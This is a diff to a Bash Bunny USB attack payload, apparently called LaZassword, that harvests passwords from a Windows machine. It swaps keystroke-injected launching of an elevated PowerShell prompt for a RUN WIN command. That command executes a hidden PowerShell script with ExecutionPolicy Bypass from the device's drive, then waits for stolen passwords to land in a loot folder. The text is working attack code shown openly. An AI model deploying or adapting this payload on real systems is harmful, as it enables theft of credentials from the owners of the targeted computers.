@@ -20,12 +20,7 @@ GET TARGET_HOSTNAME
 LED ATTACK
 
 # Run lazassword.ps1 as admin
-Q GUI r
-Q STRING "powerShell -windowstyle hidden -ExecutionPolicy Bypass .((gwmi win32_volume -f 'label=''BashBunny''').Name+'payloads\\$SWITCH_POSITION\lazassword.ps1')"
-Q CTRL-SHIFT ENTER
-sleep 1
-Q LEFT
-Q ENTER
+RUN WIN "powerShell -windowstyle hidden -ExecutionPolicy Bypass .((gwmi win32_volume -f 'label=''BashBunny''').Name+'payloads\\$SWITCH_POSITION\bypass.ps1')"
 
 # Wait until passwords are grabbed
 while [ ! -f /root/udisk/loot/LaZassword/done ]
